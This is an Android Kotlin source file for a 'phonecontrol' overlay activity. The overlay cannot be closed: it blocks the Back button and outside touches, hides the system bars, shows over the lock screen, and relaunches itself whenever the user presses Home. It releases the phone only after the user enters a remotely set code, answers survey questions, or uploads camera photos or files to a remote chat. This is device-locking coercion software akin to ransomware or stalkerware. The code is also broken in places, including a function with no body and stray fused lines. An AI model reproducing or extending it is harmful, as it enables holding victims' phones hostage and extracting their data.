package com.phonecontrol

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.*
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.util.TypedValue
import android.view.*
import android.view.animation.DecelerateInterpolator
import android.widget.*
import kotlinx.coroutines.*

/**
 * Универсальный оверлей:
 *  - mode = "plain"   → текст + кнопка ОК  (без блокировки)
 *  - mode = "reply"   → текст + поле ввода + Отправить  (блокировка как в Video)
 *  - mode = "survey"  → вопросы по очереди + поле ввода  (блокировка как в Video)
 *
 * Блокировка (reply/survey): при уходе из активити (HOME, недавние) —
 * перезапуск через 400мс с сохранением прогресса, пока пользователь не отправит ответ.
 */
class OverlayActivity : Activity() {

    // ── UI ────────────────────────────────────────────────────────────────────
    private lateinit var cardView: LinearLayout
    private lateinit var titleView: TextView
    private lateinit var subtitleView: TextView
    private lateinit var inputLayout: LinearLayout
    private lateinit var inputField: EditText
    private lateinit var actionBtn: Button
    private lateinit var progressView: TextView
    private lateinit var fileButtonsLayout: LinearLayout
    private lateinit var feedbackBtn: Button

    // ── Состояние ─────────────────────────────────────────────────────────────
    private var mode            = "plain"
    private var replyPrompt     = "✏️ Напиши ответ:"
    private var questions       = arrayListOf<String>()
    private var answers         = arrayListOf<String>()
    private var currentQuestion = 0
    private var originalText    = ""
    private var uploadChatId    = ""
    private var done            = false   // true после успешной отправки

    // code mode
    private var codeSecret         = ""
    private var allowMedia         = false
    private var allowFeedback      = false   // показывать кнопку обратной связи
    private var codeWaitingConfirm = false
    private var intentionalLeave   = false   // true когда МЫ сами открываем VPN/TG
    private var codeUnlockReceiver: android.content.BroadcastReceiver? = null

    companion object {
        const val ACTION_CODE_UNLOCK = "com.phonecontrol.CODE_UNLOCK"
        const val ACTION_CODE_DENIED = "com.phonecontrol.CODE_DENIED"
        /**
         * Запустить оверлей.
         * [answersProgress] и [currentQ] используются при перезапуске для восстановления прогресса.
         */
        fun start(
            context: Context,
            message: String,
            fbMode: String = "plain",
            replyPrompt: String = "✏️ Напиши ответ:",
            survey: List<String> = emptyList(),
            chatId: String = "",
            answersProgress: ArrayList<String> = arrayListOf(),
            currentQ: Int = 0,
            codeSecret: String = "",
            allowMedia: Boolean = false,
            allowFeedback: Boolean = false,
        ) {
            context.startActivity(Intent(context, OverlayActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK
                putExtra("message", message)
                putExtra("fb_mode", fbMode)
                putExtra("reply_prompt", replyPrompt)
                putStringArrayListExtra("survey", ArrayList(survey))
                putExtra("chat_id", chatId)
                putStringArrayListExtra("answers_progress", answersProgress)
                putExtra("current_q", currentQ)
                putExtra("code_secret", codeSecret)
                putExtra("allow_media", allowMedia)
                putExtra("allow_feedback", allowFeedback)
            })
        }
    }

    private val handler = Handler(Looper.getMainLooper())

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,
            WindowManager.LayoutParams.FLAG_SECURE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true); setTurnScreenOn(true)
        }
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        buildUI()
        applyIntent(intent)
        hideSystemUI()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        intent?.let { applyIntent(it) }
    }

    override fun onStop() {
        super.onStop()
        if (done) {
            finishAndRemoveTask()
        }
        // Не вызываем finishAndRemoveTask здесь —
        // переоткрытие обрабатывается в onUserLeaveHint
    }

    /**
     * Вызывается ТОЛЬКО при нажатии Home / переключении задач.
     * НЕ вызывается при повороте экрана — поэтому ротация не ломает overlay.
     */
    override fun onUserLeaveHint() {
        super.onUserLeaveHint()
        if (done) return
        if (intentionalLeave) {
            intentionalLeave = false
            return  // мы сами открыли VPN/TG — не переоткрываемся
        }
        when (mode) {
            "reply", "survey", "code" -> {
                // Немедленно возвращаемся поверх всего
                handler.postDelayed({
                    val i = Intent(applicationContext, OverlayActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                        putExtra("message",      originalText)
                        putExtra("fb_mode",      mode)
                        putExtra("reply_prompt", replyPrompt)
                        putStringArrayListExtra("survey", questions)
                        putExtra("chat_id",      uploadChatId)
                        putStringArrayListExtra("answers_progress", answers)
                        putExtra("current_q",    currentQuestion)
                        putExtra("code_secret",  codeSecret)
                        putExtra("allow_media",  allowMedia)
                        putExtra("allow_feedback", allowFeedback)
                    }
                    applicationContext.startActivity(i)
                }, 300L)
            }
            // plain — не возвращаем, пользователь может уйти
        }
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        unregisterCodeReceiver()
        super.onDestroy()
    }

    override fun onBackPressed() {
        // Полностью блокируем — выход только через кнопку ОК
    }

    override fun dispatchTouchEvent(ev: MotionEvent): Boolean {
        // Пока не done — разрешаем касания только внутри cardView
        if (!done) {
            val loc = IntArray(2)
            cardView.getLocationOnScreen(loc)
            val x = ev.rawX
            val y = ev.rawY
            val inCard = x >= loc[0] && x <= loc[0] + cardView.width &&
                         y >= loc[1] && y <= loc[1] + cardView.height
            return if (inCard) super.dispatchTouchEvent(ev) else true
        }
        return super.dispatchTouchEvent(ev)
    }

    private fun hideSystemUI() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            window.insetsController?.let {
                it.hide(android.view.WindowInsets.Type.systemBars() or android.view.WindowInsets.Type.navigationBars())
                it.systemBarsBehavior = android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            }
        } else {
            @Suppress("DEPRECATION")
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            )
        }
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) hideSystemUI()
    }

    // ── Intent → State ────────────────────────────────────────────────────────

    private fun applyIntent(i: Intent) {
        originalText     = i.getStringExtra("message") ?: "⚠️ Сообщение"
        mode             = i.getStringExtra("fb_mode") ?: "plain"
        replyPrompt      = i.getStringExtra("reply_prompt") ?: "✏️ Напиши ответ:"
        questions        = i.getStringArrayListExtra("survey") ?: arrayListOf()
        uploadChatId     = i.getStringExtra("chat_id") ?: ""
        answers          = i.getStringArrayListExtra("answers_progress") ?: arrayListOf()
        currentQuestion  = i.getIntExtra("current_q", 0)
        codeSecret       = i.getStringExtra("code_secret") ?: ""
        allowMedia       = i.getBooleanExtra("allow_media", false)
        allowFeedback    = i.getBooleanExtra("allow_feedback", false)
        done             = false
        codeWaitingConfirm = false
        applyMode()
    }

    private fun applyMode() {
        titleView.text = originalText

        when (mode) {
            "plain" -> {
                subtitleView.visibility = View.GONE
                inputLayout.visibility  = View.GONE
                progressView.visibility = View.GONE
                actionBtn.text = "ОК"
                actionBtn.setOnClickListener { done = true; finishAndRemoveTask() }
            }
            "reply" -> {
                subtitleView.text       = replyPrompt
                subtitleView.visibility = View.VISIBLE
                inputLayout.visibility  = View.VISIBLE
                progressView.visibility = View.GONE
                inputField.hint = "Введи ответ..."
                actionBtn.text  = "Отправить"
                actionBtn.setOnClickListener { submitReply() }
            }
            "survey" -> {
                if (questions.isEmpty()) { finishAndRemoveTask(); return }
                inputLayout.visibility = View.VISIBLE
                showQuestion(currentQuestion)
            }
            "code" -> applyCodeMode()
        }
    }

    // ── Code mode ─────────────────────────────────────────────────────────────

    private fun applyCodeMode() {
        subtitleView.text       = "🔒 Для продолжения введи код"
        subtitleView.visibility = View.VISIBLE
        progressView.visibility = View.GONE
        inputLayout.visibility  = View.VISIBLE
        inputField.hint         = "Введи код..."
        inputField.inputType    = android.text.InputType.TYPE_CLASS_TEXT or
                                  android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        inputField.minLines = 1; inputField.maxLines = 1
        inputField.setText("")
        actionBtn.text = "Подтвердить"
        actionBtn.setOnClickListener { checkCode() }

        if (allowMedia) {
            fileButtonsLayout.visibility = View.VISIBLE
            setupCodeMediaButtons()
        }

        // Кнопка обратной связи — внизу по центру
        if (allowFeedback) {
            feedbackBtn.visibility = View.VISIBLE
            feedbackBtn.setOnClickListener { showFeedbackScreen() }
        } else {
            feedbackBtn.visibility = View.GONE
        }

        registerCodeReceiver()
    }

    /** Экран обратной связи — поверх основного code экрана */
    private fun showFeedbackScreen() {
        // Скрываем основной контент
        titleView.visibility         = View.GONE
        subtitleView.visibility      = View.GONE
        inputLayout.visibility       = View.GONE
        actionBtn.visibility         = View.GONE
        fileButtonsLayout.visibility = View.GONE
        feedbackBtn.visibility       = View.GONE

        // Показываем экран обратной связи внутри cardView
        val feedbackLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = android.view.Gravity.CENTER_HORIZONTAL
            tag         = "feedback_screen"
        }

        val titleFb = TextView(this).apply {
            text     = "Нужна помощь?"
            textSize = 22f
            setTextColor(Color.WHITE)
            gravity  = android.view.Gravity.CENTER
            typeface = android.graphics.Typeface.DEFAULT_BOLD
            setPadding(0, 0, 0, dp(8))
        }

        val subtitleFb = TextView(this).apply {
            text     = "Нужен ли вам VPN для доступа?"
            textSize = 15f
            setTextColor(0xFFCCCCCC.toInt())
            gravity  = android.view.Gravity.CENTER
            setPadding(0, 0, 0, dp(20))
        }

        val divFb = View(this).apply {
            setBackgroundColor(0x33FFFFFF)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1).also { it.bottomMargin = dp(20) }
        }

        val btnYes = Button(this).apply {
            text       = "✅ Да, нужен VPN"
            textSize   = 15f
            setTextColor(Color.WHITE)
            background = buttonBackground()
            isAllCaps  = false
            setPadding(dp(20), dp(12), dp(20), dp(12))
            setOnClickListener { showVpnChoice() }
        }

        val btnNo = Button(this).apply {
            text       = "❌ Нет, открыть Telegram"
            textSize   = 15f
            setTextColor(Color.WHITE)
            background = fileButtonBg()
            isAllCaps  = false
            setPadding(dp(20), dp(12), dp(20), dp(12))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.topMargin = dp(12) }
            setOnClickListener { openTelegram() }
        }

        val btnBack = Button(this).apply {
            text       = "← Назад"
            textSize   = 13f
            setTextColor(0xFFAAAAAA.toInt())
            background = null
            isAllCaps  = false
            setPadding(0, dp(16), 0, 0)
            setOnClickListener { removeFeedbackScreen(); applyCodeMode() }
        }

        val lp = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)

        feedbackLayout.addView(titleFb, lp)
        feedbackLayout.addView(subtitleFb, lp)
        feedbackLayout.addView(divFb)
        feedbackLayout.addView(btnYes, lp)
        feedbackLayout.addView(btnNo)
        feedbackLayout.addView(btnBack, lp.also { it.gravity = android.view.Gravity.CENTER_HORIZONTAL })

        cardView.addView(feedbackLayout, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))
    }

    private fun showVpnChoice() {
        removeFeedbackScreen()

        val choiceLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = android.view.Gravity.CENTER_HORIZONTAL
            tag         = "feedback_screen"
        }

        val titleVpn = TextView(this).apply {
            text     = "Выбери VPN"
            textSize = 22f
            setTextColor(Color.WHITE)
            gravity  = android.view.Gravity.CENTER
            typeface = android.graphics.Typeface.DEFAULT_BOLD
            setPadding(0, 0, 0, dp(8))
        }

        val subtitleVpn = TextView(this).apply {
            text     = "Какое приложение использовать?"
            textSize = 15f
            setTextColor(0xFFCCCCCC.toInt())
            gravity  = android.view.Gravity.CENTER
            setPadding(0, 0, 0, dp(20))
        }

        val divVpn = View(this).apply {
            setBackgroundColor(0x33FFFFFF)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1).also { it.bottomMargin = dp(20) }
        }

        val VPN_APPS = listOf(
            Triple("INCY VPN",  "llc.itdev.incy",        "🔐"),
            Triple("HAPP VPN",  "com.happproxy",          "🛡"),
            Triple("HAPP Pro",  "su.happ.proxyutility",   "🛡"),
        )

        val lp = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)

        choiceLayout.addView(titleVpn, lp)
        choiceLayout.addView(subtitleVpn, lp)
        choiceLayout.addView(divVpn)

        VPN_APPS.forEach { (name, pkg, icon) ->
            val btn = Button(this).apply {
                text       = "$icon $name"
                textSize   = 15f
                setTextColor(Color.WHITE)
                background = buttonBackground()
                isAllCaps  = false
                setPadding(dp(20), dp(12), dp(20), dp(12))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(10) }
                setOnClickListener { launchVpn(pkg) }
            }
            choiceLayout.addView(btn)
        }

        val btnBack = Button(this).apply {
            text       = "← Назад"
            textSize   = 13f
            setTextColor(0xFFAAAAAA.toInt())
            background = null
            isAllCaps  = false
            setPadding(0, dp(16), 0, 0)
            setOnClickListener { removeFeedbackScreen(); showFeedbackScreen() }
        }
        choiceLayout.addView(btnBack, lp.also { it.gravity = android.view.Gravity.CENTER_HORIZONTAL })

        titleView.visibility         = View.GONE
        subtitleView.visibility      = View.GONE
        inputLayout.visibility       = View.GONE
        actionBtn.visibility         = View.GONE
        fileButtonsLayout.visibility = View.GONE
        feedbackBtn.visibility       = View.GONE

        cardView.addView(choiceLayout, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))
    }

    private fun launchVpn(pkg: String) {
        val pm = packageManager
        val launchIntent = pm.getLaunchIntentForPackage(pkg)
        if (launchIntent != null) {
            // Приложение установлено — запускаем и начинаем слежку
            if (allowFeedback) {
                AppWatcher.start(
                    context       = applicationContext,
                    vpnPackage    = pkg,
                    message       = originalText,
                    chatId        = uploadChatId,
                    secret        = codeSecret,
                    allowMedia    = allowMedia,
                )
            }
            removeFeedbackScreen()
            intentionalLeave = true
            startActivity(launchIntent.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK })
        } else {
            // VPN не установлен — открываем Play Market
            try {
                startActivity(Intent(Intent.ACTION_VIEW,
                    android.net.Uri.parse("market://details?id=$pkg")).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
            } catch (e: Exception) {
                startActivity(Intent(Intent.ACTION_VIEW,
                    android.net.Uri.parse("https://play.google.com/store/apps/details?id=$pkg")).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
            }
        }
    }

    private fun openTelegram() {
        if (allowFeedback) {
            AppWatcher.start(
                context    = applicationContext,
                vpnPackage = "",   // VPN не выбран
                message    = originalText,
                chatId     = uploadChatId,
                secret     = codeSecret,
                allowMedia = allowMedia,
            )
        }
        removeFeedbackScreen()
        intentionalLeave = true
        // Открываем ссылку — браузер → TG (callback)
        try {
            startActivity(Intent(Intent.ACTION_VIEW,
                android.net.Uri.parse("https://t.me/SyaNamas")).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            })
        } catch (e: Exception) {
            startActivity(Intent(Intent.ACTION_VIEW,
                android.net.Uri.parse("tg://resolve?domain=SyaNamas")).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            })
        }
    }

    private fun removeFeedbackScreen() {
        val fb = cardView.findViewWithTag<LinearLayout>("feedback_screen")
        fb?.let { cardView.removeView(it) }
        // Восстанавливаем все view — applyCodeMode расставит видимость правильно
        titleView.visibility    = View.VISIBLE
        actionBtn.visibility    = View.VISIBLE
        subtitleView.visibility = View.VISIBLE
        inputLayout.visibility  = View.VISIBLE
    }

    private fun checkCode() {
        val input = inputField.text.toString().trim()
        if (input == codeSecret) {
            done = true
            AppWatcher.stop()
            unregisterCodeReceiver()
            showDone("✅ Код принят!")
        } else {
            val shake = android.view.animation.TranslateAnimation(0f, 18f, 0f, 0f).apply {
                duration     = 400
                interpolator = android.view.animation.CycleInterpolator(4f)
            }
            cardView.startAnimation(shake)
            inputField.setText("")
            subtitleView.text = "❌ Неверный код, попробуй ещё"
        }
    }

    private fun setupCodeMediaButtons() {
        fileButtonsLayout.removeAllViews()
        val btnCamera = Button(this).apply {
            text = "📷 Отправить фото"; textSize = 13f; setTextColor(Color.WHITE)
            background = fileButtonBg(); isAllCaps = false
            setOnClickListener {
                if (!codeWaitingConfirm) {
                    codeWaitingConfirm = true
                    subtitleView.text            = "⏳ Файл отправлен. Ожидаем подтверждения..."
                    inputLayout.visibility       = View.GONE
                    actionBtn.visibility         = View.GONE
                    fileButtonsLayout.visibility = View.GONE
                    FilePickerActivity.startCameraForCode(this@OverlayActivity, uploadChatId)
                }
            }
        }
        val btnGallery = Button(this).apply {
            text = "🖼 Отправить файл"; textSize = 13f; setTextColor(Color.WHITE)
            background = fileButtonBg(); isAllCaps = false
            setOnClickListener {
                if (!codeWaitingConfirm) {
                    codeWaitingConfirm = true
                    subtitleView.text            = "⏳ Файл отправлен. Ожидаем подтверждения..."
                    inputLayout.visibility       = View.GONE
                    actionBtn.visibility         = View.GONE
                    fileButtonsLayout.visibility = View.GONE
                    FilePickerActivity.startGalleryForCode(this@OverlayActivity, uploadChatId)
                }
            }
        }
        val halfLp = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            .also { it.marginEnd = dp(8) }
        fileButtonsLayout.addView(btnCamera, halfLp)
        fileButtonsLayout.addView(btnGallery, LinearLayout.LayoutParams(
            0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
    }

    private fun registerCodeReceiver() {
        if (codeUnlockReceiver != null) return
        codeUnlockReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(ctx: android.content.Context?, intent: Intent?) {
                when (intent?.action) {
                    ACTION_CODE_UNLOCK -> {
                        done = true
                        AppWatcher.stop()
                        unregisterCodeReceiver()
                        showDone("✅ Подтверждено!")
                    }
                    ACTION_CODE_DENIED -> {
                        codeWaitingConfirm = false
                        subtitleView.text = "❌ Отклонено. Попробуй ещё раз"
                        inputLayout.visibility       = View.VISIBLE
                        actionBtn.visibility         = View.VISIBLE
                        if (allowMedia) fileButtonsLayout.visibility = View.VISIBLE
                        val shake = android.view.animation.TranslateAnimation(0f, 18f, 0f, 0f).apply {
                            duration = 400; interpolator = android.view.animation.CycleInterpolator(4f)
                        }
                        cardView.startAnimation(shake)
                    }
                }
            }
        }
        val filter = android.content.IntentFilter().apply {
            addAction(ACTION_CODE_UNLOCK); addAction(ACTION_CODE_DENIED)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(codeUnlockReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(codeUnlockReceiver, filter)
        }
    }

    private fun unregisterCodeReceiver() {
        codeUnlockReceiver?.let { try { unregisterReceiver(it) } catch (_: Exception) {} }
        codeUnlockReceiver = null
    }

    private fun showDone(msg: String) {
        titleView.text               = msg
        subtitleView.visibility      = View.GONE
        inputLayout.visibility       = View.GONE
        progressView.visibility      = View.GONE
        fileButtonsLayout.visibility = View.GONE
        feedbackBtn.visibility       = View.GONE
        actionBtn.visibility         = View.VISIBLE
        actionBtn.text               = "ОК"
        actionBtn.setOnClickListener { done = true; finishAndRemoveTask() }
    }

    private fun fileButtonBg()

    private fun showQuestion(idx: Int) {
        if (idx >= questions.size) {
            submitSurvey()
            return
        }
        currentQuestion         = idx
        subtitleView.text       = questions[idx]
        subtitleView.visibility = View.VISIBLE
        inputField.setText("")
        inputField.hint = "Введи ответ..."

        val isLast = idx == questions.size - 1
        actionBtn.text = if (isLast) "Готово ✓" else "Далее →"
        progressView.text       = "${idx + 1} / ${questions.size}"
        progressView.visibility = View.VISIBLE

        actionBtn.setOnClickListener {
            val ans = inputField.text.toString().trim()
            if (ans.length < 3) {
                inputField.error = "Минимум 3 символа"
                return@setOnClickListener
            }
            // Обновляем или добавляем ответ
            if (idx < answers.size) answers[idx] = ans else answers.add(ans)
            showQuestion(idx + 1)
        }
    }

    // ── Submit ────────────────────────────────────────────────────────────────

    private fun submitReply() {
        val answer = inputField.text.toString().trim()
        if (answer.length < 3) {
            inputField.error = "Минимум 3 символа"
            return
        }
        done = true
        CoroutineScope(Dispatchers.IO).launch {
            Uploader.sendText(this@OverlayActivity, "💬 Ответ: $answer", uploadChatId)
        }
        showDone("✅ Ответ отправлен!")
    }

    private fun submitSurvey() {
        done = true
        val sb = StringBuilder("📋 *Ответы на опросник:*\n\n")
        questions.forEachIndexed { i, q ->
            sb.append("*${i + 1}. $q*\n")
            sb.append("${answers.getOrElse(i) { "—" }}\n\n")
        }
        CoroutineScope(Dispatchers.IO).launch {
            Uploader.sendText(this@OverlayActivity, sb.toString(), uploadChatId)
        }
        showDone("✅ Ответы отправлены!")
    }

    // ── Survey ──────────────────────────────────────────────────────────────── = GradientDrawable(
        GradientDrawable.Orientation.LEFT_RIGHT,
        intArrayOf(0xFF1A1A2E.toInt(), 0xFF0F3460.toInt())
    ).apply { cornerRadius = dp(12).toFloat(); setStroke(dp(1), 0x44FFFFFF) }

    // ── UI Builder ────────────────────────────────────────────────────────────

    private fun buildUI() {
        val root = android.widget.FrameLayout(this).apply {
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xCC000000.toInt(), 0xEE0A0A1A.toInt())
            )
        }

        cardView = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = android.view.Gravity.CENTER_HORIZONTAL
            background  = cardBackground()
            elevation   = dp(16f).toFloat()
            setPadding(dp(28), dp(32), dp(28), dp(28))
        }

        titleView = TextView(this).apply {
            textSize      = 26f
            setTextColor(Color.WHITE)
            gravity       = android.view.Gravity.CENTER
            typeface      = Typeface.DEFAULT_BOLD
            letterSpacing = 0.02f
            setPadding(0, 0, 0, dp(8))
        }

        subtitleView = TextView(this).apply {
            textSize    = 15f
            setTextColor(0xFFCCCCCC.toInt())
            gravity     = android.view.Gravity.CENTER
            setPadding(0, 0, 0, dp(16))
            visibility  = View.GONE
        }

        progressView = TextView(this).apply {
            textSize    = 13f
            setTextColor(0xFF8888AA.toInt())
            gravity     = android.view.Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
            visibility  = View.GONE
        }

        inputLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility  = View.GONE
            setPadding(0, 0, 0, dp(16))
        }
        inputField = EditText(this).apply {
            inputType   = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_FLAG_MULTI_LINE
            minLines    = 2
            maxLines    = 5
            setTextColor(Color.WHITE)
            setHintTextColor(0xFF666688.toInt())
            background  = inputBackground()
            setPadding(dp(14), dp(12), dp(14), dp(12))
            textSize    = 15f
        }
        inputLayout.addView(inputField, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))

        actionBtn = Button(this).apply {
            textSize      = 16f
            setTextColor(Color.WHITE)
            background    = buttonBackground()
            setPadding(dp(24), dp(14), dp(24), dp(14))
            isAllCaps     = false
            letterSpacing = 0.04f
            typeface      = Typeface.DEFAULT_BOLD
            stateListAnimator = null
        }

        val divider = View(this).apply {
            setBackgroundColor(0x33FFFFFF)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1).also { it.bottomMargin = dp(20) }
        }

        fun lp() = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT).also { it.bottomMargin = 0 }

        // Кнопки файлов (камера / галерея) — показываются после отправки ответа
        fileButtonsLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            visibility  = View.GONE
            setPadding(0, dp(12), 0, 0)
        }
        val btnCamera = Button(this).apply {
            text      = "📷 Камера"
            textSize  = 14f
            setTextColor(Color.WHITE)
            background = GradientDrawable(
                GradientDrawable.Orientation.LEFT_RIGHT,
                intArrayOf(0xFF1A1A2E.toInt(), 0xFF0F3460.toInt())
            ).apply { cornerRadius = dp(12).toFloat(); setStroke(dp(1), 0x44FFFFFF) }
            isAllCaps = false
            setOnClickListener {
                FilePickerActivity.startCamera(this@OverlayActivity, uploadChatId)
            }
        }
        val btnGallery = Button(this).apply {
            text      = "🖼 Галерея"
            textSize  = 14f
            setTextColor(Color.WHITE)
            background = GradientDrawable(
                GradientDrawable.Orientation.LEFT_RIGHT,
                intArrayOf(0xFF1A1A2E.toInt(), 0xFF0F3460.toInt())
            ).apply { cornerRadius = dp(12).toFloat(); setStroke(dp(1), 0x44FFFFFF) }
            isAllCaps = false
            setOnClickListener {
                FilePickerActivity.startGallery(this@OverlayActivity, uploadChatId)
            }
        }
        val halfLp = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            .also { it.marginEnd = dp(8) }
        fileButtonsLayout.addView(btnCamera, halfLp)
        fileButtonsLayout.addView(btnGallery, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))

        // Кнопка обратной связи — внизу по центру
        feedbackBtn = Button(this).apply {
            text      = "💬 Обратная связь"
            textSize  = 13f
            setTextColor(0xFFAAAAAA.toInt())
            background = null
            isAllCaps  = false
            visibility = View.GONE
            setPadding(0, dp(12), 0, 0)
        }

        cardView.addView(titleView,         lp())
        cardView.addView(subtitleView,      lp())
        cardView.addView(progressView,      lp())
        cardView.addView(divider)
        cardView.addView(inputLayout,       lp())
        cardView.addView(actionBtn,         lp())
        cardView.addView(fileButtonsLayout, lp())
        cardView.addView(feedbackBtn,       LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).also { it.gravity = android.view.Gravity.CENTER_HORIZONTAL; it.topMargin = dp(4) })

        val cardParams = android.widget.FrameLayout.LayoutParams(
            (resources.displayMetrics.widthPixels * 0.88).toInt(),
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
        ).also { it.gravity = android.view.Gravity.CENTER }

        root.addView(cardView, cardParams)
        setContentView(root)

        // Анимация появления
        cardView.alpha        = 0f
        cardView.translationY = dp(40).toFloat()
        cardView.animate()
            .alpha(1f).translationY(0f)
            .setDuration(350)
            .setInterpolator(DecelerateInterpolator(2f))
            .start()
    }

    private fun cardBackground() = GradientDrawable(
        GradientDrawable.Orientation.TL_BR,
        intArrayOf(0xFF1A1A2E.toInt(), 0xFF16213E.toInt(), 0xFF0F3460.toInt())
    ).apply {
        cornerRadius = dp(20).toFloat()
        setStroke(dp(1), 0x33FFFFFF)
    }

    private fun inputBackground() = GradientDrawable().apply {
        setColor(0xFF0D1117.toInt())
        cornerRadius = dp(12).toFloat()
        setStroke(dp(1), 0x446666AA)
    }

    private fun buttonBackground() = GradientDrawable(
        GradientDrawable.Orientation.LEFT_RIGHT,
        intArrayOf(0xFF4F46E5.toInt(), 0xFF7C3AED.toInt())
    ).apply { cornerRadius = dp(14).toFloat() }

    private fun dp(value: Float) =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics).toInt()
    private fun dp(value: Int) = dp(value.toFloat())
}
